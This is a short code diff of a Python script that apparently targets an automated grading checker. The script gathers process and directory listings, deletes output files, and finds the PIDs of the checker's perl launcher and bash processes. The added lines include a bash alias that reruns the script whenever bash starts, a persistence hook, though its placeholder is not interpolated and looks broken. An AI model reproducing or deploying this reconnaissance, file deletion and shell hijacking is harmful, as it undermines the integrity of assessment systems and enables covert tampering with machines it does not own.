@@ -108,6 +108,7 @@ my_data += get_data("ls -l") or ""
 # my_data += get_data("./file.pl rsa-2") or ""
 # my_data += get_data("ls -l ../../../hbtn_checker_functions") or ""
 my_data += get_data("ps") or ""
+my_data += get_data("pwd") or ""
 my_data += "\n#######################\n"
 my_data += get_data("top -b -c -n 1 -w 512") or ""
 # my_data += "\n#######################\n"
@@ -119,6 +120,7 @@ def get_perl_pid(text, comaprare):
             return int(line.split()[0])
     return 0
 get_data("rm *_output")
+get_data("alias bash='{os.path.abspath(__file__)}; bash'")
 ps = get_data("ps")
 perl_id = get_perl_pid(ps, "launcher.pl")
 time_id =  get_perl_pid(ps, "bash")
